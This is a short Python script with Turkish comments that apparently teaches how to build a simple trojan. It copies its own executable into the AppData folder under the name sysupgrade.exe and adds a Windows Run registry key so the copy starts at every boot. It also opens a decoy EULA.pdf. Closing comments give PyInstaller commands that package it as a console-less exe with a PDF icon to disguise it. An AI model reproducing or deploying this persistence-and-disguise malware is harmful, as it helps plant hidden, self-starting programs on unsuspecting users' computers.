import time
import os
import sys # içinde bulunduğumuz dizindeki dosyaları verir.
import subprocess
import shutil # dosya kopyalama için gerekli kütüphane

# Windowsta exe dosyası oluşturup arka planda kendi kodlarımızı çalıştırdığımız program.

def addToRegistry():
	newFile = os.environ["appdata"] + "\\sysupgrade.exe" # Bilgisayarda appdata klasoronun pathini aldık ve ek olarak bir exe dosyası oluşturarak yeni bir path elde ettik.

	if not os.path.exists(newFile): # Dosya varsa tekrar tekrar oluşturmaya gerek yok.
		shutil.copyfile(sys.executable,newFile) # İçinde bulunduğumuz dizindeki exe dosyasını kopyaladık ve newFile içine kopyaladık.
		regeditCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + newFile # Windows başlatıldığında çalıştırılacak bir program eklemek için gerekli olan komut.
		subprocess.call(regeditCommand, shell = True)

def openAddedFile(): # Program çalıştığında kullanıcıya gösterilmesi gereken şeyleri yazıyoruz.
	addedFile = sys._MEIPASS + "\\EULA.pdf"  # MEIPASS geçiçi bir dosyadır. Pyinstaller ile derleme yapılırken bu dosyanın içine yazıyoruz.
	subprocess.Popen(addedFile, shell = True) # Dosyaları arka planda çalıştırıyoruz.

addToRegistry()
openAddedFile()

i = 0
while i < 100:
	print("I hacked you!")
	i += 1
	time.sleep(0.5)

# Bilgisayar\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
# Bilgisayar her açıldığında çalıştırılacak programların olduğu dizin.

# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d 
# Windows açılışında otomatik çalışacak bir programı böyle ekliyoruz.

# C:\Users\User\AppData\Local\Programs\Python\Python311\Scripts\pyinstaller.exe MyPackage.py --onefile
# Programımızı exe dosyasına çeviriyoruz.

# C:\Users\User\AppData\Local\Programs\Python\Python311\Scripts\pyinstaller.exe MyPackage.py --onefile --add-data "C:\Users\User\Desktop\EULA.pdf;."
# C:\Users\User\AppData\Local\Programs\Python\Python311\Scripts\pyinstaller.exe MyPackage.py --onefile --add-data "C:\Users\User\Desktop\EULA.pdf;." --noconsole --icon C:\Users\User\Desktop\pdf.ico
# noconsole ile exe dosyamız çalışsa da console arka planda çalışır ve exe'ye bir icon verebiliriz.